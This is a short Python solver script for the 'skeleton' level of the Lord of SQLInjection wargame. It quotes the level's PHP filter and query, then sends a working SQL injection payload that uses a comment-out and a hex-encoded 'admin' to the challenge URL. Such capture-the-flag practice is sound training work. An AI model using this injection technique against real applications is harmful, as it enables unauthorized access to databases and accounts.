#!/usr/bin/env python3
import los


def main():
    '''
    Skeleton

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id'] == 'admin') solve("skeleton"); 
    '''

    url = "https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php"
    cook = los.check_cookies(url)

    param = dict(pw="'||id=0x61646d696e#")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('SKELETON Clear!')


if __name__ == '__main__':
    main()
